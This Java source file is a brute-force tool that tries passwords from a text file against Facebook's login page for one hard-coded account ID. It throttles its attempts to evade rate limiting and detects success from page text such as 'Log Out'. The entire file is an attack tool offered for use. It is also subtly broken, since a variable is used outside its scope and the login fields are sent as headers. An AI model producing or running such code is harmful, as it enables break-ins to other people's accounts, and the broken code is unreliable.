import org.apache.http.HttpEntity;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.util.EntityUtils;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;

import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;

public class FacebookBruteForce {

    private static final String POST_URL = "https://www.facebook.com/login.php";
    private static final String USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36";
    private static final int MAX_ATTEMPTS_PER_HOUR = 5;
    private static int ATTEMPT_COUNTER = 0;

    public static void main(String[] args) {
        System.out.println("---------- Welcome To Facebook BruteForce ----------");

        String passwordFile = "passwords.txt";
        String userId = "61558937932042";

        try {
            Map<String, String> formData = getFormData();
            CloseableHttpClient httpClient = HttpClients.createDefault();

            BufferedReader reader = new BufferedReader(new FileReader(passwordFile));
            String password;
            while ((password = reader.readLine()) != null) {
                if (ATTEMPT_COUNTER >= MAX_ATTEMPTS_PER_HOUR) {
                    System.out.println("Reached maximum attempts per hour. Waiting for an hour...");
                    Thread.sleep(3600 * 1000);
                    ATTEMPT_COUNTER = 0;
                }

                formData.put("pass", password);
                boolean isPasswordFound = isThisAPassword(httpClient, formData);
                if (isPasswordFound) {
                    System.out.println("Password found is: " + password);
                    break;
                }

                ATTEMPT_COUNTER++;
                Thread.sleep(new Random().nextInt(1000) + 2000); // Random delay between 2 and 3 seconds
            }

        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }

    private static Map<String, String> getFormData() throws IOException {
        Document doc = Jsoup.connect(POST_URL)
                .userAgent(USER_AGENT)
                .get();

        Map<String, String> formData = new HashMap<>();
        formData.put("lsd", doc.select("input[name=lsd]").first().val());
        formData.put("jazoest", userId + "_");

        return formData;
    }

    private static boolean isThisAPassword(CloseableHttpClient httpClient, Map<String, String> formData) {
        HttpPost httpPost = new HttpPost(POST_URL);
        httpPost.setHeader("User-Agent", USER_AGENT);

        try {
            for (Map.Entry<String, String> entry : formData.entrySet()) {
                httpPost.addHeader(entry.getKey(), entry.getValue());
            }

            CloseableHttpResponse response = httpClient.execute(httpPost);
            HttpEntity entity = response.getEntity();
            String responseBody = EntityUtils.toString(entity);

            if (responseBody.contains("Find Friends") || responseBody.contains("security code")
                    || responseBody.contains("Two-factor authentication") || responseBody.contains("Log Out")) {
                return true;
            }

        } catch (IOException e) {
            e.printStackTrace();
        }

        return false;
    }
}
